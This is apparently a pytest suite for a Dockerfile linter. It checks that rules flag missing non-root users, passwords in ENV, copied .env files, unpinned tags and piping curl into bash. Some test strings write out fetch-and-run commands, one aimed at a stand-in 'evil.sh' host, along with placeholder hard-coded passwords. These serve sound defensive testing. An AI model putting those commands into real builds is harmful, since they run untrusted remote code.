"""Tests for the high-level analyze API."""

import pytest
from docker_optimizer.optimizer import analyze
from docker_optimizer.rules import Severity


GOOD_DOCKERFILE = """\
FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
RUN useradd -m appuser
USER appuser
HEALTHCHECK --interval=30s CMD curl -f http://localhost:8000/health || exit 1
CMD ["python", "app.py"]
"""


def test_good_dockerfile_score():
    report = analyze(GOOD_DOCKERFILE)
    # Should score well — no critical issues
    assert not report.critical
    assert report.score >= 60  # may have minor info findings


def test_no_user_is_critical():
    df_content = "FROM ubuntu:22.04\nRUN apt-get update\nCMD [\"/bin/bash\"]\n"
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.critical]
    assert "RULE-07" in rule_ids


def test_secret_in_env():
    df_content = (
        "FROM alpine:3.18\n"
        "ENV DB_PASSWORD=supersecret123\n"
        "USER nobody\n"
        "CMD [\"sh\"]\n"
    )
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.critical]
    assert "RULE-08" in rule_ids


def test_copy_dotenv_critical():
    df_content = (
        "FROM alpine:3.18\n"
        "COPY .env /app/.env\n"
        "USER nobody\n"
        "CMD [\"sh\"]\n"
    )
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.critical]
    assert "RULE-09" in rule_ids


def test_apt_no_clean_warning():
    df_content = (
        "FROM ubuntu:22.04\n"
        "RUN apt-get update && apt-get install -y curl\n"
        "USER nobody\n"
    )
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.warnings]
    assert "RULE-03" in rule_ids


def test_multiple_run_warning():
    df_content = (
        "FROM alpine:3.18\n"
        "RUN apk add --no-cache curl\n"
        "RUN apk add --no-cache git\n"
        "RUN apk add --no-cache bash\n"
        "USER nobody\n"
    )
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.warnings]
    assert "RULE-02" in rule_ids


def test_latest_tag_warning():
    df_content = "FROM ubuntu:latest\nUSER nobody\n"
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.warnings]
    assert "RULE-01" in rule_ids


def test_unpinned_tag_warning():
    df_content = "FROM ubuntu\nUSER nobody\n"
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.warnings]
    assert "RULE-01" in rule_ids


def test_multistage_no_flag():
    df_content = (
        "FROM golang:1.21 AS build\n"
        "RUN go build -o /app main.go\n"
        "FROM gcr.io/distroless/base\n"
        "COPY --from=build /app /app\n"
        "USER nonroot\n"
        "CMD [\"/app\"]\n"
    )
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.warnings]
    # Already multi-stage — RULE-12 should NOT fire
    assert "RULE-12" not in rule_ids


def test_build_tools_suggest_multistage():
    df_content = (
        "FROM ubuntu:22.04\n"
        "RUN apt-get update && apt-get install -y gcc build-essential\n"
        "RUN gcc -o app main.c\n"
        "USER nobody\n"
        "CMD [\"/app\"]\n"
    )
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.warnings + report.info + report.critical]
    assert "RULE-12" in rule_ids


def test_add_instead_of_copy_info():
    df_content = (
        "FROM alpine:3.18\n"
        "ADD myapp.py /app/myapp.py\n"
        "USER nobody\n"
    )
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.info]
    assert "RULE-10" in rule_ids


def test_add_tar_not_flagged():
    df_content = (
        "FROM alpine:3.18\n"
        "ADD archive.tar.gz /opt/\n"
        "USER nobody\n"
    )
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.info]
    assert "RULE-10" not in rule_ids


def test_curl_pipe_sh_critical():
    df_content = (
        "FROM ubuntu:22.04\n"
        "RUN curl -sSL https://example.com/install.sh | bash\n"
        "USER nobody\n"
    )
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.critical]
    assert "RULE-16" in rule_ids


def test_score_decreases_with_issues():
    clean_report = analyze(GOOD_DOCKERFILE)
    dirty_report = analyze(
        "FROM ubuntu:latest\n"
        "ENV PASSWORD=admin123\n"
        "RUN curl https://evil.sh | bash\n"
    )
    assert dirty_report.score < clean_report.score


def test_pip_no_cache_dir():
    df_content = (
        "FROM python:3.12-slim\n"
        "RUN pip install requests flask\n"
        "USER nobody\n"
    )
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.info]
    assert "RULE-05" in rule_ids


def test_heavy_base_image_info():
    df_content = "FROM ubuntu:22.04\nUSER nobody\n"
    report = analyze(df_content)
    rule_ids = [f.rule_id for f in report.info]
    assert "RULE-11" in rule_ids


def test_analyze_path(tmp_path):
    from docker_optimizer.optimizer import analyze_file
    df = tmp_path / "Dockerfile"
    df.write_text("FROM alpine:3.18\nUSER nobody\n")
    report = analyze_file(str(df))
    assert report.path == str(df)
    assert not report.critical
